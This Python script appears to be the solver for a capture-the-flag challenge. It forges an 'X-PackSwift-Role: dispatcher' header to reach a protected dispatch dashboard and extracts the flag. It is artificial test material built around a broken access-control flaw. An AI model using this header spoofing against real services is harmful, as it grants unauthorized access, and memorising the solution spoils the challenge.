#!/usr/bin/env python3
"""Solver: ask the dispatch dashboard with the role header the portal trusts."""

import argparse
import re
import sys
import urllib.error
import urllib.request

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")
ROLE_HEADER = "X-PackSwift-Role"
DISPATCHER = "dispatcher"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", required=True)
    args = parser.parse_args()

    url = args.base_url.rstrip("/") + "/portal/dispatch"
    request = urllib.request.Request(url, headers={ROLE_HEADER: DISPATCHER})
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            body = response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        print(f"solver: the dispatch dashboard answered {error.code}", file=sys.stderr)
        return 1
    except (urllib.error.URLError, OSError) as error:
        print(f"solver: request failed: {error}", file=sys.stderr)
        return 1

    match = FLAG.search(body)
    if not match:
        print("solver: no flag on the dispatch dashboard", file=sys.stderr)
        return 1

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
